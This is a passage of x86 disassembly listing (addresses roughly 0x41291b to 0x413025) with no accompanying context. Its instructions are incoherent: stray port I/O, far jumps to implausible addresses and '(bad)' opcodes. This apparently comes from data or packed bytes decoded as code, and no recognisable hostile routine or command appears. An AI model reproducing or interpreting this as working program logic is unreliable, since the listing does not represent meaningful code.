  41291b:	cmp    DWORD PTR [esi+0x79],ebp
  41291e:	cwde   
  41291f:	imul   ebp,DWORD PTR ss:[esi-0x53],0x10
  412924:	imul   ebp,DWORD PTR [ecx-0x55],0xc7736b62
  41292b:	outs   dx,BYTE PTR ds:[esi]
  41292c:	je     0x41292e
  41292e:	stos   BYTE PTR es:[edi],al
  41292f:	and    dh,BYTE PTR [edx]
  412931:	xor    bl,BYTE PTR [edx-0x229dffde]
  412937:	jb     0x41299b
  412939:	ins    BYTE PTR es:[edi],dx
  41293a:	std    
  41293b:	pop    esp
  41293c:	add    BYTE PTR [ecx],dh
  41293e:	sub    DWORD PTR [edi],ebx
  412940:	sub    eax,0x2d1f1931
  412945:	add    bl,ch
  412947:	cmp    BYTE PTR [edi+0x61],bl
  41294a:	jnp    0x4129bb
  41294c:	ins    BYTE PTR es:[edi],dx
  41294d:	popa   
  41294e:	sbb    BYTE PTR [edx+0x6b],dh
  412951:	jb     0x4129bf
  412953:	cmp    DWORD PTR [esi+0x32],ebp
  412956:	sbb    ebx,DWORD PTR [eax]
  412958:	gs ins BYTE PTR es:[edi],dx
  41295a:	daa    
  41295b:	inc    esi
  41295c:	popa   
  41295d:	addr16 aaa 
  41295f:	xor    al,0x0
  412961:	data16 aaa 
  412963:	outs   dx,DWORD PTR ds:[esi]
  412964:	je     0x4129c8
  412966:	sub    DWORD PTR [esp+ebp*2+0x31],ebp
  41296a:	fsubr  DWORD PTR [ebx+0x6b]
  41296d:	jbe    0x4129b0
  41296f:	outs   dx,BYTE PTR ds:[esi]
  412970:	arpl   WORD PTR [eax],ax
  412972:	add    BYTE PTR [eax],al
  412974:	cmp    DWORD PTR ss:[eax+ebp*2+0x29],esi
  412979:	outs   dx,BYTE PTR ds:[esi]
  41297a:	add    BYTE PTR [ebp-0x1b],ah
  41297d:	ins    BYTE PTR es:[edi],dx
  41297e:	pop    ebp
  41297f:	outs   dx,BYTE PTR ds:[esi]
  412980:	fnsave [esp+ebp*2]
  412983:	add    BYTE PTR [ecx],dh
  412985:	out    dx,al
  412986:	ins    WORD PTR es:[edi],dx
  412988:	inc    esi
  412989:	fild   QWORD PTR [eax+eax*1+0x17]
  41298d:	nop
  41298e:	imul   dx,WORD PTR [esi],0x5fdb
  412993:	add    BYTE PTR [edx],ah
  412995:	fcomp  QWORD PTR [eax+0x6b]
  412998:	sbb    BYTE PTR [ebp-0x4df6a0a8],bh
  41299e:	pusha  
  41299f:	ins    BYTE PTR es:[edi],dx
  4129a0:	adc    eax,0x25f5bbd
  4129a5:	call   0x6e59:0x520b0057
  4129ac:	xor    DWORD PTR [esp+esi*2+0x608dde32],ecx
  4129b3:	xor    al,0xe3
  4129b5:	mov    esp,0x43d35f63
  4129ba:	add    DWORD PTR [edx-0x2c],esi
  4129bd:	pusha  
  4129be:	xor    esi,DWORD PTR [edx]
  4129c0:	add    bh,BYTE PTR [ebp+0x5ed06c63]
  4129c6:	pop    eax
  4129c7:	pop    edi
  4129c8:	xor    DWORD PTR [ebp+0x76],ebp
  4129cb:	addr16 lahf 
  4129cd:	pop    esi
  4129ce:	pop    edi
  4129cf:	add    BYTE PTR [eax-0x5a8da0f6],ah
  4129d5:	mov    ebp,0x6866
  4129da:	mov    WORD PTR [ecx],ss
  4129dc:	jne    0x412a41
  4129de:	nop
  4129df:	mov    ebp,0xe83c3330
  4129e4:	xor    BYTE PTR [eax],al
  4129e6:	nop
  4129e7:	sbb    esp,DWORD PTR [ecx+0x63]
  4129ea:	test   esp,ebp
  4129ec:	add    DWORD PTR [eax+0x50],ebp
  4129ef:	iret   
  4129f0:	pop    ebp
  4129f1:	popa   
  4129f2:	push   esi
  4129f3:	iret   
  4129f4:	pusha  
  4129f5:	add    BYTE PTR [ebp+0x20],dl
  4129f8:	ins    BYTE PTR es:[edi],dx
  4129f9:	je     0x412a47
  4129fb:	iret   
  4129fc:	add    DWORD PTR [ecx+0x50],esi
  4129ff:	adc    al,0xdd
  412a01:	pusha  
  412a02:	dec    ebp
  412a03:	adc    al,0x18
  412a05:	xor    eax,0x371a0603
  412a0a:	xor    DWORD PTR [eax+ecx*8],edi
  412a0d:	push   edi
  412a0e:	sbb    eax,0x65de743
  412a13:	inc    edi
  412a14:	mov    bh,0x60
  412a16:	and    edx,DWORD PTR [ebx+ecx*8]
  412a19:	fs pop es
  412a1b:	cmp    eax,0x391d57c4
  412a20:	out    0x5e,eax
  412a22:	push   cs
  412a23:	dec    eax
  412a24:	xchg   ebx,eax
  412a25:	pusha  
  412a26:	unpcklps xmm1,XMMWORD PTR [edx-0x7fb8ff9c]
  412a2d:	pusha  
  412a2e:	xor    DWORD PTR [edi+0x7b],eax
  412a31:	pusha  
  412a32:	aad    0x3f
  412a34:	mov    BYTE PTR [ebx],al
  412a36:	loope  0x412a7d
  412a38:	mov    BYTE PTR [edx+edx*8+0x45],ch
  412a3c:	out    0x5b,eax
  412a3e:	add    BYTE PTR [eax],al
  412a40:	fadd   QWORD PTR [edi+0x4b]
  412a43:	pop    ecx
  412a44:	int3   
  412a45:	adc    edx,DWORD PTR [esi+0x5b]
  412a48:	iret   
  412a49:	aaa    
  412a4a:	inc    esi
  412a4b:	jno    0x412a0d
  412a4d:	adc    edi,DWORD PTR [edi+ebp*2]
  412a50:	mov    al,ds:0x925b4b48
  412a55:	adc    al,0x46
  412a57:	arpl   WORD PTR [ebp-0x6cfbc5c9],sp
  412a5d:	cmp    edi,DWORD PTR [ebx]
  412a5f:	pop    eax
  412a60:	xchg   esp,eax
  412a61:	xor    ebx,DWORD PTR [ebx]
  412a63:	pop    edi
  412a64:	adc    BYTE PTR [esi+eax*1],0x5c
  412a68:	xchg   ebx,eax
  412a69:	cmp    BYTE PTR [ebx],bl
  412a6b:	pop    edx
  412a6c:	xor    DWORD PTR [ecx],edi
  412a6e:	add    eax,0x143d5b5c
  412a73:	add    al,0x16
  412a75:	push   es
  412a76:	mov    edx,0xa222f
  412a7b:	mov    esi,0xe930090a
  412a80:	xor    dh,BYTE PTR ds:0x4a3ce274
  412a86:	imul   ecx,esi,0xdc754244
  412a8c:	xor    bh,BYTE PTR [esp+esi*2]
  412a8f:	aad    0x22
  412a91:	push   cs
  412a92:	sub    eax,0x66420a16
  412a97:	into   
  412a98:	and    BYTE PTR ds:0x4038c865,dh
  412a9e:	je     0x412a93
  412aa0:	pop    edx
  412aa1:	add    al,0x38
  412aa3:	fld    DWORD PTR [eax]
  412aa5:	add    BYTE PTR [ecx],ch
  412aa7:	inc    esp
  412aa8:	ins    DWORD PTR es:[edi],dx
  412aa9:	(bad)  
  412aaa:	or     edi,edi
  412aac:	mov    BYTE PTR fs:[esi],al
  412aaf:	xor    eax,0x440a992e
  412ab4:	add    BYTE PTR [ecx-0x3c8fb82a],dl
  412aba:	cmp    edi,edi
  412abc:	jo     0x412b3a
  412abe:	int3   
  412abf:	aaa    
  412ac0:	pop    edi
  412ac1:	jne    0x412a96
  412ac3:	inc    ebx
  412ac4:	jb     0x412b1c
  412ac6:	sub    esi,DWORD PTR [ebx]
  412ac8:	ins    DWORD PTR es:[edi],dx
  412ac9:	dec    esp
  412aca:	(bad)  
  412acc:	xor    BYTE PTR [ecx],bl
  412ace:	add    eax,0x8b3e6fff
  412ad3:	dec    ecx
  412ad4:	sub    eax,0x6348924e
  412ad9:	shld   DWORD PTR [eax+esi*2],edi,cl
  412add:	jmp    0x35b56714
  412ae2:	test   DWORD PTR [esi],ecx
  412ae4:	sub    eax,0x754781d6
  412ae9:	iret   
  412aea:	pop    edi
  412aeb:	xor    DWORD PTR ss:[ebx],ecx
  412aee:	or     DWORD PTR [esi+0x2e],0x2d3d880a
  412af5:	add    BYTE PTR [edi+0x2d546606],ah
  412afb:	adc    DWORD PTR [eax+0x6b],ebx
  412afe:	out    dx,eax
  412aff:	inc    ebx
  412b00:	xor    eax,0x2dfdcb6b
  412b05:	shl    BYTE PTR gs:[ecx+0x0],1
  412b09:	push   0x40e40000
  412b0e:	jo     0x412b4a
  412b10:	das    
  412b11:	sub    esp,DWORD PTR [esi+0x74]
  412b14:	mov    BYTE PTR [edx],ch
  412b16:	gs ins DWORD PTR es:[edi],dx
  412b18:	call   0xe5aa9d8e
  412b1d:	imul   esp,DWORD PTR [ebp+0x74],0x6d6b372e
  412b24:	mov    ?,WORD PTR [esi]
  412b26:	jb     0x412b57
  412b28:	mov    bh,0x42
  412b2a:	imul   edx,DWORD PTR [edi-0x60],0x62
  412b2e:	push   esi
  412b2f:	outs   dx,WORD PTR ds:[esi]
  412b31:	outs   dx,DWORD PTR ds:[esi]
  412b32:	imul   edx,DWORD PTR [ebx-0x4c],0x7e316971
  412b39:	jno    0x412bb3
  412b3b:	gs dec eax
  412b3d:	ins    BYTE PTR es:[edi],dx
  412b3e:	je     0x412bb4
  412b40:	fdivr  st,st(6)
  412b42:	sub    ch,BYTE PTR [edi]
  412b44:	int3   
  412b45:	xor    eax,0x33de6176
  412b4a:	popa   
  412b4b:	jb     0x412b2e
  412b4d:	ss je  0x412bb9
  412b50:	out    dx,al
  412b51:	jo     0x412bb4
  412b53:	ins    DWORD PTR es:[edi],dx
  412b54:	jns    0x412bc7
  412b56:	outs   dx,DWORD PTR ds:[esi]
  412b57:	cs jnp 0x412bc1
  412b5a:	imul   ebp,DWORD PTR [esi],0x462b426a
  412b60:	push   ss
  412b61:	push   ebp
  412b62:	jne    0x412bb7
  412b64:	add    eax,0x592f3310
  412b69:	add    eax,0x40352e69
  412b6e:	popa   
  412b6f:	add    BYTE PTR [eax],al
  412b71:	add    BYTE PTR [ecx],dh
  412b73:	mov    ebp,0xd78534c
  412b78:	dec    ebp
  412b79:	inc    esp
  412b7a:	outs   dx,DWORD PTR ds:[esi]
  412b7b:	add    al,0x38
  412b7d:	inc    ebx
  412b7e:	and    esp,esi
  412b80:	dec    esi
  412b81:	inc    edi
  412b82:	xor    edx,0x3178463f
  412b88:	aas    
  412b89:	xor    BYTE PTR [eax-0x70],ch
  412b8c:	cmp    al,0x41
  412b8e:	arpl   sp,dx
  412b90:	push   ecx
  412b91:	push   esp
  412b92:	ins    BYTE PTR es:[edi],dx
  412b93:	xor    DWORD PTR [ecx],0x34740457
  412b99:	cs popa 
  412b9b:	mov    ebp,0xbd310001
  412ba0:	(bad)  
  412ba1:	jmp    esp
  412ba3:	jne    0x412be2
  412ba5:	push   ebx
  412ba6:	xor    BYTE PTR [ecx+eax*1+0x1bd3100],bh
  412bad:	add    BYTE PTR [ecx],dh
  412baf:	mov    ebp,0x90ef4d52
  412bb4:	dec    esi
  412bb5:	aas    
  412bb6:	add    edi,DWORD PTR [eax+0x45]
  412bb9:	dec    ebx
  412bba:	fcomp  DWORD PTR [ecx-0x621d9291]
  412bc0:	pop    ebx
  412bc1:	je     0x412bb8
  412bc3:	lods   eax,DWORD PTR ds:[esi]
  412bc4:	pop    esp
  412bc5:	outs   dx,BYTE PTR ds:[esi]
  412bc6:	aad    0x4d
  412bc8:	outs   dx,BYTE PTR ds:[esi]
  412bc9:	jno    0x412bb0
  412bcb:	stc    
  412bcc:	outs   dx,BYTE PTR ds:[esi]
  412bcd:	jb     0x412b92
  412bcf:	push   edi
  412bd0:	push   esi
  412bd1:	je     0x412bb2
  412bd3:	pop    edi
  412bd4:	jb     0x412c47
  412bd6:	add    BYTE PTR [eax],al
  412bd8:	cwde   
  412bd9:	push   cs
  412bda:	push   esi
  412bdb:	pop    esp
  412bdc:	jl     0x412c45
  412bde:	pop    ebx
  412bdf:	outs   dx,BYTE PTR ds:[esi]
  412be0:	mov    ds:0x856c6309,al
  412be5:	mov    ebp,0xf986e50
  412bea:	jno    0x412c60
  412bec:	nop
  412bed:	adc    al,0x13
  412bef:	pop    eax
  412bf0:	pusha  
  412bf1:	dec    eax
  412bf2:	sbb    DWORD PTR [ebp-0x79],ebx
  412bf5:	aaa    
  412bf6:	out    0x3f,eax
  412bf8:	push   esi
  412bf9:	inc    ebx
  412bfa:	pop    ss
  412bfb:	pop    eax
  412bfc:	xchg   BYTE PTR [ebp+0x35],cl
  412bff:	gs dec edx
  412c01:	cmp    edi,esp
  412c03:	inc    edi
  412c04:	xor    DWORD PTR [edi+eiz*8],edx
  412c07:	add    esi,DWORD PTR [ecx]
  412c09:	adc    al,0xe7
  412c0b:	add    esi,DWORD PTR [ecx]
  412c0d:	cmp    ecx,esp
  412c0f:	jno    0x412c60
  412c11:	cmp    ebx,ecx
  412c13:	xor    al,BYTE PTR [ebx]
  412c15:	dec    dl
  412c17:	push   edi
  412c18:	sbb    eax,0x4fb614
  412c1d:	push   edi
  412c1e:	int3   
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	pop    esi
  412c21:	xor    esi,DWORD PTR [ebx-0x55c6e0a4]
  412c27:	push   esi
  412c28:	pop    ds
  412c29:	inc    ebx
  412c2a:	mov    esi,0x8c631257
  412c2f:	jb     0x412c31
  412c31:	cmp    eax,0x37ee558e
  412c36:	out    0x53,eax
  412c38:	jecxz  0x412c78
  412c3a:	mov    ah,BYTE PTR [eax+0x0]
  412c3d:	add    al,ah
  412c3f:	inc    edx
  412c40:	mov    al,0x5f
  412c42:	add    eax,0xe0609a3f
  412c47:	inc    edx
  412c48:	adc    BYTE PTR [esi-0x21],0x5c
  412c4c:	add    DWORD PTR [ebx],0x31
  412c4f:	adc    al,0xe7
  412c51:	add    esi,DWORD PTR [ecx]
  412c53:	adc    al,0xe7
  412c55:	add    esi,DWORD PTR [ecx]
  412c57:	xor    ebx,DWORD PTR [ecx+0x6b]
  412c5a:	mov    eax,ds:0x57321a48
  412c5f:	cmp    BYTE PTR [ebx+0x58],dl
  412c62:	xor    DWORD PTR [ecx+0x39],edx
  412c65:	imul   esp,DWORD PTR [ecx+0x671c0048],0x44
  412c6c:	jb     0x412cac
  412c6e:	xor    DWORD PTR [ecx],0x6d711d61
  412c74:	je     0x412c7e
  412c76:	sub    eax,0x32e90014
  412c7b:	(bad)  
  412c7c:	bound  edx,QWORD PTR [ecx]
  412c7e:	xchg   BYTE PTR [ecx+edx*2],dl
  412c81:	push   ss
  412c82:	jg     0x412ccc
  412c84:	jne    0x412c8e
  412c86:	arpl   WORD PTR [ecx],si
  412c88:	pop    esp
  412c89:	push   ds
  412c8a:	push   0x3e
  412c8c:	push   edx
  412c8d:	sub    BYTE PTR [ebx+0x14],ah
  412c90:	ins    DWORD PTR es:[edi],dx
  412c91:	fstp   DWORD PTR [edi+0x3e]
  412c94:	add    al,ch
  412c96:	xor    dl,BYTE PTR [eax+eax*4]
  412c99:	fimul  DWORD PTR [edx]
  412c9b:	xor    DWORD PTR [ebp+edi*4+0x61],ebp
  412c9f:	add    ch,BYTE PTR [esi]
  412ca1:	int    0x0
  412ca3:	add    BYTE PTR [esi],al
  412ca5:	inc    eax
  412ca6:	add    BYTE PTR [edx-0x429ca8a6],bl
  412cac:	dec    esp
  412cad:	aas    
  412cae:	ins    BYTE PTR es:[edi],dx
  412caf:	(bad)
  412cb2:	push   eax
  412cb3:	mov    BYTE PTR [esi],cl
  412cb5:	cmp    al,0x3f
  412cb7:	jmp    0xe94140ee
  412cbc:	xor    cl,BYTE PTR [edx-0x20cd57d9]
  412cc2:	daa    
  412cc3:	test   al,0x32
  412cc5:	out    dx,eax
  412cc6:	daa    
  412cc7:	test   al,0x32
  412cc9:	shl    DWORD PTR [edi],0xa8
  412ccc:	xor    dl,BYTE PTR [ebx]
  412cce:	sub    ch,BYTE PTR [eax+0x282a2332]
  412cd4:	xor    eax,0x2d2829f3
  412cd9:	or     al,0x2a
  412cdb:	sub    BYTE PTR ds:0x2d282a5f,dh
  412ce1:	xor    ebp,DWORD PTR [edx]
  412ce3:	add    BYTE PTR [ecx+0x18],cl
  412ce6:	jl     0x412d12
  412ce8:	dec    ecx
  412ce9:	sbb    BYTE PTR [eax-0x46e7a6d6],ah
  412cef:	sub    bl,BYTE PTR [ecx+0x18]
  412cf2:	add    BYTE PTR [eax],al
  412cf4:	or     BYTE PTR [ecx],dl
  412cf6:	std    
  412cf7:	dec    DWORD PTR [eax]
  412cf9:	xchg   ecx,eax
  412cfa:	add    DWORD PTR [eax],eax
  412cfc:	fcom   DWORD PTR [eax]
  412cfe:	dec    ecx
  412cff:	jns    0x412cf9
  412d01:	or     al,0x6b
  412d03:	arpl   bp,bx
  412d05:	gs popa 
  412d07:	outs   dx,BYTE PTR ds:[esi]
  412d08:	add    BYTE PTR [eax],al
  412d0a:	fadd   QWORD PTR [ebx+0x0]
  412d0d:	add    eax,ebx
  412d0f:	adc    BYTE PTR [eax+0x10d81a],al
  412d15:	inc    ecx
  412d16:	fadd   DWORD PTR [eax+0x44]
  412d19:	popa   
  412d1a:	fdiv   QWORD PTR [ecx]
  412d1c:	add    BYTE PTR [ecx],al
  412d1e:	cwde   
  412d1f:	adc    BYTE PTR [eax+0x10981c],al
  412d25:	dec    esp
  412d26:	xchg   DWORD PTR [ebx],esi
  412d28:	pop    ebp
  412d29:	ins    BYTE PTR es:[edi],dx
  412d2a:	sub    BYTE PTR [ecx+0x70],dl
  412d2d:	jo     0x412d0b
  412d2f:	xor    DWORD PTR [ecx+eiz*2-0x68],esi
  412d33:	adc    DWORD PTR [eax],eax
  412d35:	add    BYTE PTR [eax],cl
  412d37:	icebp  
  412d38:	(bad)  
  412d39:	dec    DWORD PTR [eax-0x4f9ca2ad]
  412d3f:	ins    DWORD PTR es:[edi],dx
  412d40:	add    BYTE PTR [ecx],al
  412d42:	pop    eax
  412d43:	adc    BYTE PTR [eax+0x104821],al
  412d49:	inc    ebx
  412d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d4b:	addr16 imul edi,DWORD PTR [di+0x43],0x80105801
  412d55:	and    cl,BYTE PTR [eax+0x10]
  412d58:	add    BYTE PTR [eax-0x1f],cl
  412d5b:	fs je  0x412dcd
  412d5e:	xor    DWORD PTR [edi+0x5b],ebp
  412d61:	add    BYTE PTR [ebx],dh
  412d63:	mov    ebp,0xbd348001
  412d68:	add    DWORD PTR [eax],eax
  412d6a:	fs push esp
  412d6c:	and    al,0x44
  412d6e:	add    BYTE PTR [eax],al
  412d70:	sahf   
  412d71:	pop    esi
  412d72:	push   edi
  412d73:	imul   ecx,DWORD PTR [ebx+ecx*1-0x40ce8ea8],0x1
  412d7b:	add    BYTE PTR [ecx+0x310001de],dh
  412d81:	(bad)  
  412d82:	jo     0x412def
  412d84:	push   esp
  412d85:	retf   0x206f
  412d88:	jo     0x412d57
  412d8a:	push   ecx
  412d8b:	inc    esp
  412d8c:	push   eax
  412d8d:	shl    DWORD PTR [eax+eax*1+0x30],0xbd
  412d92:	add    DWORD PTR [eax+0x1bd0e],eax
  412d98:	ins    BYTE PTR es:[edi],dx
  412d99:	mov    ah,0x21
  412d9b:	push   eax
  412d9c:	dec    eax
  412d9d:	ficom  WORD PTR [ebp+0x73]
  412da0:	and    ebx,eax
  412da2:	push   esi
  412da3:	add    BYTE PTR [ebx],dh
  412da5:	mov    ebp,0xbd4f8001
  412daa:	add    DWORD PTR [eax],eax
  412dac:	repnz fnstenv [eax+0x6b]
  412db0:	push   ds
  412db1:	shl    DWORD PTR [ecx],cl
  412db3:	inc    esp
  412db4:	push   ss
  412db5:	ficomp WORD PTR [eax+0x6b]
  412db8:	adc    al,0xa3
  412dba:	push   ebp
  412dbb:	jno    0x412dee
  412dbd:	mov    edi,0xd2b10001
  412dc2:	add    DWORD PTR [eax],eax
  412dc4:	xor    DWORD PTR [esi+0x72],edi
  412dc7:	imul   ecx,esp,0xffffffa1
  412dca:	outs   dx,DWORD PTR ds:[esi]
  412dcb:	and    al,dh
  412dcd:	nop
  412dce:	jo     0x412e37
  412dd0:	fist   WORD PTR [ebx+0x7456]
  412dd6:	ret    
  412dd7:	fwait
  412dd8:	push   ebp
  412dd9:	addr16 (bad) 
  412ddb:	adc    ecx,DWORD PTR [esp-0x23]
  412ddf:	cmp    cl,BYTE PTR [esi+0x70]
  412de2:	mov    al,ds:0x3103e814
  412de7:	xchg   esp,eax
  412de8:	pop    ss
  412de9:	add    al,0x31
  412deb:	adc    al,0x28
  412ded:	push   0x6d4d3d8a
  412df2:	add    BYTE PTR [eax+0x39],0x65
  412df6:	jge    0x412e35
  412df8:	xor    eax,0x16605169
  412dfd:	jae    0x412d84
  412dff:	inc    edi
  412e00:	out    0x4,eax
  412e02:	xor    DWORD PTR [edi+eiz*2],edx
  412e05:	or     BYTE PTR [ecx],dh
  412e07:	adc    al,0xe7
  412e09:	xor    edx,DWORD PTR [edx+0x46]
  412e0c:	cli    
  412e0d:	jb     0x412e56
  412e0f:	xor    eax,0x3b60040b
  412e14:	or     eax,0xf9353c58
  412e19:	push   0x66d0595d
  412e1e:	inc    ebx
  412e1f:	cmp    ebx,edx
  412e21:	jb     0x412e3a
  412e23:	inc    eax
  412e24:	mov    bl,0x3a
  412e26:	push   cs
  412e27:	cmp    al,bl
  412e29:	jb     0x412e4f
  412e2b:	inc    edi
  412e2c:	mov    ds:0xb9462246,eax
  412e31:	push   0x689d401f
  412e36:	add    eax,DWORD PTR [edi-0x40]
  412e39:	jb     0x412e3b
  412e3b:	add    BYTE PTR [edi],cl
  412e3d:	push   0x38015bac
  412e42:	mov    ss,WORD PTR [ebp-0x2e]
  412e45:	inc    ebp
  412e46:	mov    bl,0x36
  412e48:	fnstenv [eax]
  412e4a:	jnp    0x412ebb
  412e4c:	adc    DWORD PTR [edx-0x6a],edx
  412e4f:	outs   dx,DWORD PTR ds:[esi]
  412e50:	int    0x30
  412e52:	jns    0x412eaa
  412e54:	xor    DWORD PTR [eax+eax*1-0x5a],esp
  412e58:	call   FWORD PTR [edi+0x20]
  412e5b:	(bad)  
  412e5c:	out    0xf3,eax
  412e5e:	inc    edi
  412e5f:	cmp    eax,0x182d63f9
  412e64:	arpl   WORD PTR [ebx+ecx*1],ax
  412e67:	jecxz  0x412ee3
  412e69:	aaa    
  412e6a:	jno    0x412ec1
  412e6c:	aas    
  412e6d:	hlt    
  412e6e:	and    bh,BYTE PTR [edx]
  412e70:	es push ds
  412e72:	aas    
  412e73:	dec    edx
  412e74:	xchg   esp,eax
  412e75:	xor    eax,0xf4273d70
  412e7a:	sub    esi,edi
  412e7c:	dec    esp
  412e7d:	sbb    eax,0x338c280a
  412e82:	arpl   WORD PTR [ecx],bx
  412e84:	mov    ebp,edi
  412e86:	inc    edx
  412e87:	pop    es
  412e88:	dec    esp
  412e89:	aaa    
  412e8a:	add    BYTE PTR fs:[ebx+0x2f],ah
  412e8e:	cmp    cl,cl
  412e90:	dec    ebx
  412e91:	xor    BYTE PTR [ebx+0xf],ah
  412e94:	imul   esi,DWORD PTR [ecx],0xf416f074
  412e9a:	sub    DWORD PTR [edx-0xbcff29d],esi
  412ea0:	add    BYTE PTR [eax],al
  412ea2:	and    al,0x53
  412ea4:	ins    DWORD PTR es:[edi],dx
  412ea5:	iret   
  412ea6:	push   es
  412ea7:	xor    eax,0x5857dd6e
  412eac:	arpl   WORD PTR [edi+0x3684009],di
  412eb2:	dec    ebp
  412eb3:	cmc    
  412eb4:	imul   esi,DWORD PTR [edi+edi*1+0xc6411e],0x3a
  412ebc:	arpl   dx,cx
  412ebe:	out    0x30,al
  412ec0:	ins    DWORD PTR es:[edi],dx
  412ec1:	xchg   edi,eax
  412ec2:	adc    al,0xf4
  412ec4:	pusha  
  412ec5:	(bad)  
  412ec6:	loope  0x412f0a
  412ec8:	arpl   sp,sp
  412eca:	xor    al,0x53
  412ecc:	ins    DWORD PTR es:[edi],dx
  412ecd:	jg     0x412ed5
  412ecf:	xor    eax,0xf9d4006e
  412ed4:	push   ebx
  412ed5:	jns    0x412e9f
  412ed7:	xor    DWORD PTR [edx],edi
  412ed9:	and    BYTE PTR [ecx-0x4e938f9b],bh
  412edf:	xor    BYTE PTR [ebp+0x74],bl
  412ee2:	loope  0x412f26
  412ee4:	outs   dx,BYTE PTR ds:[esi]
  412ee5:	das    
  412ee6:	jg     0x412f17
  412ee8:	je     0x412f4f
  412eea:	test   cl,bh
  412eec:	outs   dx,BYTE PTR ds:[esi]
  412eed:	je     0x412f69
  412eef:	xor    DWORD PTR [ebp+0x6d],ebx
  412ef2:	sbb    eax,0x7e6f3f17
  412ef7:	ins    BYTE PTR es:[edi],dx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	inc    esp
  412efb:	stc    
  412efc:	inc    eax
  412efd:	outs   dx,BYTE PTR ds:[esi]
  412efe:	imul   eax,DWORD PTR [ebx+0x64],0x69
  412f02:	push   ds
  412f03:	cmp    edi,DWORD PTR [edx]
  412f05:	and    BYTE PTR [eax],al
  412f07:	add    BYTE PTR [edx],bh
  412f09:	cmp    eax,0x6d4a616e
  412f0e:	or     DWORD PTR [edx],ecx
  412f10:	and    eax,0xfd72615f
  412f15:	push   ebp
  412f16:	arpl   WORD PTR [ebp+0x3e],sp
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	cmp    ah,BYTE PTR [eax]
  412f1c:	or     eax,0xbc697a43
  412f21:	cmp    BYTE PTR [ebp+0x2f],bl
  412f24:	adc    al,0x6
  412f26:	xor    BYTE PTR [eax],ah
  412f28:	inc    eax
  412f29:	das    
  412f2a:	imul   ebp,DWORD PTR [ebp-0x78],0x35
  412f2e:	je     0x412f99
  412f30:	push   0x38
  412f32:	popa   
  412f33:	cmp    ebp,DWORD PTR [eax]
  412f35:	pop    ecx
  412f36:	dec    edi
  412f37:	dec    ecx
  412f38:	aad    0xf4
  412f3a:	xor    BYTE PTR [esi],ch
  412f3c:	mov    BYTE PTR [edi],ah
  412f3e:	and    BYTE PTR [edi+0x71],dl
  412f41:	inc    edx
  412f42:	outs   dx,DWORD PTR fs:[esi]
  412f44:	xchg   edi,eax
  412f45:	pop    edi
  412f46:	and    BYTE PTR [ecx],bh
  412f48:	push   eax
  412f49:	std    
  412f4a:	or     BYTE PTR [edx],cl
  412f4c:	xor    DWORD PTR [eax+0x49f2000b],esi
  412f52:	outs   dx,DWORD PTR ds:[esi]
  412f53:	je     0x412f21
  412f55:	mov    al,ds:0x8ffd2b55
  412f5a:	outs   dx,DWORD PTR ds:[esi]
  412f5b:	gs mov ebp,0xed001b92
  412f61:	dec    ecx
  412f62:	fs pop edi
  412f64:	mov    ebp,0x6b6e6d63
  412f69:	mov    ebp,0x4346
  412f6e:	jge    0x412f8d
  412f70:	daa    
  412f71:	jno    0x412fc4
  412f73:	cmc    
  412f74:	aaa    
  412f75:	push   esp
  412f76:	sbb    DWORD PTR [esi],0xb8412e13
  412f7c:	pop    es
  412f7d:	dec    eax
  412f7e:	xchg   esi,eax
  412f7f:	or     bl,BYTE PTR [eax+0x3a]
  412f82:	push   ecx
  412f83:	adc    BYTE PTR [ecx+0xb],dl
  412f86:	sub    edi,esp
  412f88:	pusha  
  412f89:	popa   
  412f8a:	push   esp
  412f8b:	sub    eax,0xd3113a58
  412f90:	sub    ch,BYTE PTR cs:[ebx+esi*4]
  412f94:	inc    esp
  412f95:	popa   
  412f96:	push   edx
  412f97:	sbb    BYTE PTR [esp+esi*2+0x1c],dl
  412f9b:	lock ins DWORD PTR es:[edi],dx
  412f9d:	popa   
  412f9e:	push   esi
  412f9f:	sbb    DWORD PTR [ebx+0x6e],ebp
  412fa2:	push   esi
  412fa3:	and    DWORD PTR [ecx],0x67
  412fa6:	dec    ebp
  412fa7:	fsubr  DWORD PTR [ebx+0x74]
  412faa:	sbb    cl,ah
  412fac:	pop    esp
  412fad:	sub    al,0x51
  412faf:	adc    ebx,DWORD PTR [ecx]
  412fb1:	outs   dx,DWORD PTR ds:[esi]
  412fb2:	pop    esp
  412fb3:	sub    eax,0xddf20a0f
  412fb8:	imul   ebp,DWORD PTR [esi+0x14],0xffffffda
  412fbc:	push   ebp
  412fbd:	addr16 push ss
  412fbf:	iret   
  412fc0:	pop    ss
  412fc1:	and    BYTE PTR [edx],dl
  412fc3:	mov    DWORD PTR [esi+0x71],ebp
  412fc6:	or     al,0x14
  412fc8:	hlt    
  412fc9:	or     DWORD PTR [edx],eax
  412fcb:	inc    ebx
  412fcc:	test   BYTE PTR [ecx+0x1a],dl
  412fcf:	push   ebp
  412fd0:	mov    gs,WORD PTR [eax+0x0]
  412fd3:	add    bh,cl
  412fd5:	aas    
  412fd6:	shl    DWORD PTR [ebx],1
  412fd8:	jmp    0x8837:0xdd6c8136
  412fdf:	cs std 
  412fe1:	cmc    
  412fe2:	mov    dh,0x23
  412fe4:	or     DWORD PTR [ebx],esi
  412fe6:	jle    0x413058
  412fe8:	shl    DWORD PTR [ebx+ebx*2],0x6d
  412fec:	xchg   ebx,eax
  412fed:	cmp    BYTE PTR [ebx+ebx*1+0x51],al
  412ff1:	pop    ecx
  412ff2:	cmp    cl,BYTE PTR [ebp+0x72]
  412ff5:	hlt    
  412ff6:	adc    ebp,DWORD PTR [esi]
  412ff8:	popa   
  412ff9:	or     eax,DWORD PTR [edi]
  412ffb:	aaa    
  412ffc:	xchg   esi,eax
  412ffd:	ss inc ebx
  412fff:	outs   dx,DWORD PTR ds:[esi]
  413000:	jl     0x413045
  413002:	pop    es
  413003:	sbb    eax,0x9dbfd39
  413008:	sub    bl,BYTE PTR [edx]
  41300a:	out    0x2d,eax
  41300c:	xor    esi,esi
  41300e:	int3   
  41300f:	add    eax,DWORD PTR [ebp+0x3129c4fa]
  413015:	cli    
  413016:	mov    esp,0xc363129
  41301b:	pop    eax
  41301c:	outs   dx,BYTE PTR ds:[esi]
  41301d:	inc    esp
  41301e:	adc    BYTE PTR [ebx],dl
  413020:	add    esi,esi
  413022:	or     dh,BYTE PTR [eax+0x4d]
  413025:	adc    al,0x1d
